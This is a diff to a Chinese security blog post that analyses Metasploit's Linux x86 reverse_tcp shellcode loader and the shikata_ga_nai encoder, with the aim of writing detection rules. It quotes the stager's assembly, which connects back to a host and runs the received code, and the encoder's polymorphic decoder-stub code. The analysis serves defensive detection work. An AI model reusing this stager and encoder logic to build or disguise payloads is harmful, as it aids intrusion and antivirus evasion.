@@ -2,7 +2,6 @@
 title: 杀软的无奈-metasploit的shellcode loader分析(三)
 url: 1683.html
 id: 1683
-password: fakefake
 categories:
   - 学习记录
 date: 2021-04-25 19:57:14
@@ -525,7 +524,7 @@ emu.hook_add(UC_HOOK_INSN, hookSyscall, None, 1, 0, UC_X86_INS_SYSCALL)
 整个过程还是比较简单的。
 
 
-## 编码器的执行分析
+## 编码器的执行过程分析
 
 metepreter 的二进制编码器都是使用SMC代码来实现恶意代码的隐藏，本文使用效果excellent的编码器 `x86/shikata_ga_nai` 进行示例，接下里的代码一定要使用我patch过的unicorn才能获得预期的效果。
 
@@ -591,3 +590,301 @@ if write_bounds[0] != None:
 
 这样就会完整的dump修改之后的代码，这个修改后的代码和之前生成的代码是相同的。x86系统调用的是`int 80`中断，其实原理都是一样的， 所以不再赘述。到这里基本的原理和代码都已经讲完了，随便自己再完善一下就可以实现metasploit生成的后门的模拟执行检测了。
 
+## Metasploit生成shellcode的过程
+
+### payload 
+
+`msfvenom` 文件的路径在 `metasploit-framework/embedded/framework/msfvenom`,跟踪这个文件的中的执行流程，当 payload 为 `linux/x86/meterpreter/reverse_tcp` 会执行到文件 `metasploit-framework/embedded/framework/lib/msf/core/payload/linux/reverse_tcp_x86.rb`。
+
+- 函数 `asm_reverse_tcp` 就是生成 shellcode 主函数
+
+```ruby
+
+  def asm_reverse_tcp(opts={})
+    # TODO: reliability is coming
+    retry_count  = opts[:retry_count]
+    encoded_port = "0x%.8x" % [opts[:port].to_i, 2].pack("vn").unpack("N").first
+    encoded_host = "0x%.8x" % Rex::Socket.addr_aton(opts[:host]||"127.127.127.127").unpack("V").first
+    seconds = (opts[:sleep_seconds] || 5.0)
+    sleep_seconds = seconds.to_i
+    sleep_nanoseconds = (seconds % 1 * 1000000000).to_i
+
+    mprotect_flags = 0b111 # PROT_READ | PROT_WRITE | PROT_EXEC
+
+```
+
+获取重试次数、sleep时间，反弹地址和端口等参数信息。
+
+```ruby 
+
+    if respond_to?(:generate_intermediate_stage)
+      pay_mod = framework.payloads.create(self.refname)
+      puts "datastore:",datastore,"\n"
+
+      payload = pay_mod.generate_stage(datastore.to_h)
+      
+      # puts "payload:#{payload.split(//).each {|e|;print (e.unpack('H*').to_s)}}"
+
+      read_length = pay_mod.generate_intermediate_stage(pay_mod.generate_stage(datastore.to_h)).size
+    elsif !module_info['Stage']['Payload'].empty?
+      read_length = module_info['Stage']['Payload'].size
+    else
+      # If we don't know, at least use small instructions
+      read_length = 0x0c00 + mprotect_flags
+    end
+
+```
+
+此代码只是为了计算下一个控制阶段所要使用的 shellcode 的长度，在这里生成的shellcode不会在本次loader阶段下发。
+
+接着就是 shellcode :
+
+```ruby
+    asm = %Q^
+        push #{retry_count}        ; retry counter
+        pop esi
+      create_socket:
+        xor ebx, ebx
+        mul ebx
+        push ebx
+        inc ebx
+        push ebx
+        push 0x2
+        mov al, 0x66
+        mov ecx, esp
+        int 0x80                   ; sys_socketcall (socket())
+        xchg eax, edi              ; store the socket in edi
+
+      set_address:
+        pop ebx                    ; set ebx back to zero
+        push #{encoded_host}
+        push #{encoded_port}
+        mov ecx, esp
+
+      try_connect:
+        push 0x66
+        pop eax
+        push eax
+        push ecx
+        push edi
+        mov ecx, esp
+        inc ebx
+        int 0x80                   ; sys_socketcall (connect())
+        test eax, eax
+        jns mprotect
+
+      handle_failure:
+        dec esi
+        jz failed
+        push 0xa2
+        pop eax
+        push 0x#{sleep_nanoseconds.to_s(16)}
+        push 0x#{sleep_seconds.to_s(16)}
+        mov ebx, esp
+        xor ecx, ecx
+        int 0x80                   ; sys_nanosleep
+        test eax, eax
+        jns create_socket
+        jmp failed
+    ^
+
+    asm << asm_send_uuid if include_send_uuid
+
+    asm << %Q^
+      mprotect:
+        mov dl, 0x#{mprotect_flags.to_s(16)}
+        mov ecx, 0x1000
+        mov ebx, esp
+        shr ebx, 0xc
+        shl ebx, 0xc
+        mov al, 0x7d
+        int 0x80                  ; sys_mprotect
+        test eax, eax
+        js failed
+
+      recv:
+        pop ebx
+        mov ecx, esp
+        cdq
+        mov #{read_reg},  0x#{read_length.to_s(16)}
+        mov al, 0x3
+        int 0x80                  ; sys_read (recv())
+        test eax, eax
+        js failed
+        jmp ecx
+
+      failed:
+        mov eax, 0x1
+        mov ebx, 0x1              ; set exit status to 1
+        int 0x80                  ; sys_exit
+    ^
+
+    asm
+```
+
+这个代码之前就分析过，这里看起来就非常熟悉了。
+
+
+### encoder 
+
+上一步是生成 payload, 接下来这一步就是利用 encoder 对 payload 进行编码，
+
+encoder `x86/shikata_ga_nai` 的代码路径是 `metasploit-framework/embedded/framework/modules/encoders/x86/shikata_ga_nai.rb`:
+
+函数 `decoder_stub` 是关键，主要作用是生成 shellcode 解码的头部: 
+
+```ruby
+  def decoder_stub(state)
+
+    # If the decoder stub has not already been generated for this state, do
+    # it now.  The decoder stub method may be called more than once.
+    if (state.decoder_stub == nil)
+      # Sanity check that saved_registers doesn't overlap with modified_registers
+      if (modified_registers & saved_registers).length > 0
+        raise BadGenerateError
+      end
+
+      # Shikata will only cut off the last 1-4 bytes of it's own end
+      # depending on the alignment of the original buffer
+      cutoff = 4 - (state.buf.length & 3)
+      block = generate_shikata_block(state, state.buf.length + cutoff, cutoff) || (raise BadGenerateError)
+      # Set the state specific key offset to wherever the XORK ended up.
+      state.decoder_key_offset = block.index('XORK')
+
+      # Take the last 1-4 bytes of shikata and prepend them to the buffer
+      # that is going to be encoded to make it align on a 4-byte boundary.
+      state.buf = block.slice!(block.length - cutoff, cutoff) + state.buf
+      # Cache this decoder stub.  The reason we cache the decoder stub is
+      # because we need to ensure that the same stub is returned every time
+      # for a given encoder state.
+      state.decoder_stub = block
+    end
+
+    state.decoder_stub
+  end
+```
+
+先不看 `generate_shikata_block` 函数的实现，先打印一下 `block` 内容和最后生成的 elf 文件：
+
+```
+block: "\xDB\xCB\xBFXORK\xD9t$\xF4]3\xC9\xB1\x1F1}\x1A\x83\xED\xFC\x03}\x16\xE2\xF5"
+```
+
+![](https://pic.wonderkun.cc/uploads/2021/04/2021-05-15-16-44-18.png)
+
+可以看到 `block` 的代码就是 `fpu` 和 getPC 功能的代码，其中 `XORK` 就是最后的解密密钥，这个值是动态变化的，保证每次都不相同。
+
+但是这样的一个解密的头部，其实还是存在一个很固定的形式的，来看 `generate_shikata_block` 的代码：
+
+```ruby
+    count_reg = Rex::Poly::LogicalRegister::X86.new('count', 'ecx')
+    addr_reg  = Rex::Poly::LogicalRegister::X86.new('addr')
+    key_reg = nil
+
+    if state.context_encoding
+      key_reg = Rex::Poly::LogicalRegister::X86.new('key', 'eax')
+    else
+      key_reg = Rex::Poly::LogicalRegister::X86.new('key')
+    end
+
+    # Declare individual blocks
+    endb = Rex::Poly::SymbolicBlock::End.new
+
+    # Clear the counter register
+    clear_register = Rex::Poly::LogicalBlock.new('clear_register',
+      "\x31\xc9",  # xor ecx,ecx
+      "\x29\xc9",  # sub ecx,ecx
+      "\x33\xc9",  # xor ecx,ecx
+      "\x2b\xc9")  # sub ecx,ecx
+```
+
+`ecx` 中存储是接下来要进行解密的长度，所以需要先清空 `ecx`,清空的指令是从这几条指令中任选一条。
+
+```ruby
+
+    if (length <= 255)
+      init_counter.add_perm("\xb1" + [ length ].pack('C'))
+    elsif (length <= 65536)
+      init_counter.add_perm("\x66\xb9" + [ length ].pack('v'))
+    else
+      init_counter.add_perm("\xb9" + [ length ].pack('V'))
+    end
+
+    # Key initialization block
+    init_key = nil
+
+    # If using context encoding, we use a mov reg, [addr]
+    if state.context_encoding
+      init_key = Rex::Poly::LogicalBlock.new('init_key',
+        Proc.new { |b| (0xa1 + b.regnum_of(key_reg)).chr + 'XORK'})
+    # Otherwise, we do a direct mov reg, val
+    else
+      init_key = Rex::Poly::LogicalBlock.new('init_key',
+        Proc.new { |b| (0xb8 + b.regnum_of(key_reg)).chr + 'XORK'})
+    end
+
+    xor  = Proc.new { |b| "\x31" + (0x40 + b.regnum_of(addr_reg) + (8 * b.regnum_of(key_reg))).chr }
+    add  = Proc.new { |b| "\x03" + (0x40 + b.regnum_of(addr_reg) + (8 * b.regnum_of(key_reg))).chr }
+
+    sub4 = Proc.new { |b| sub_immediate(b.regnum_of(addr_reg), -4) }
+    add4 = Proc.new { |b| add_immediate(b.regnum_of(addr_reg), 4) }
+
+```
+
+计算偏移，生成如下四条指令:
+
+```asm
+LOAD:08048062 B1 1F                                   mov     cl, 1Fh
+LOAD:08048064 31 7D 1A                                xor     [ebp+1Ah], edi
+LOAD:08048067 83 ED FC                                sub     ebp, 0FFFFFFFCh
+LOAD:0804806A 03 7D 16                                add     edi, [ebp+16h]
+```
+
+```ruby
+	fpu = Rex::Poly::LogicalBlock.new('fpu',
+	*fpu_instructions)
+
+	fnstenv = Rex::Poly::LogicalBlock.new('fnstenv',
+	"\xd9\x74\x24\xf4")
+	fnstenv.depends_on(fpu)
+
+	# Get EIP off the stack
+	getpc = Rex::Poly::LogicalBlock.new('getpc',
+	Proc.new { |b| (0x58 + b.regnum_of(addr_reg)).chr })
+	getpc.depends_on(fnstenv)
+```
+
+生成 `fpu` 操作指令和 `fnstenv` 指令，来getpc。
+
+可以看到 `\xd9\x74\x24\xf4` 是一个硬编码，这就是一个特征。同时`fpu` 指令也是有限的：
+
+```ruby
+  def fpu_instructions
+    puts "-----sub_immediate : fpu_instructions----------------"
+    fpus = []
+
+    0xe8.upto(0xee) { |x| fpus << "\xd9" + x.chr }
+    0xc0.upto(0xcf) { |x| fpus << "\xd9" + x.chr }
+    0xc0.upto(0xdf) { |x| fpus << "\xda" + x.chr }
+    0xc0.upto(0xdf) { |x| fpus << "\xdb" + x.chr }
+    0xc0.upto(0xc7) { |x| fpus << "\xdd" + x.chr }
+
+    fpus << "\xd9\xd0"
+    fpus << "\xd9\xe1"
+    fpus << "\xd9\xf6"
+    fpus << "\xd9\xf7"
+    fpus << "\xd9\xe5"
+
+    # This FPU instruction seems to fail consistently on Linux
+    #fpus << "\xdb\xe1"
+
+    fpus
+  end
+
+```
+所有可能的指令选择都在 `fpus` 这个数组中了。剩下的部分就不再说了。
+
+
+### 检测
+
+经过上述的分析，可以发现 `x86/shikata_ga_nai` 编码器的特征也是比较固定的，所以针对这个特征写出专有的静态查杀规则也是比较简单的。本文就不再写了，有兴趣的自己写一个把。
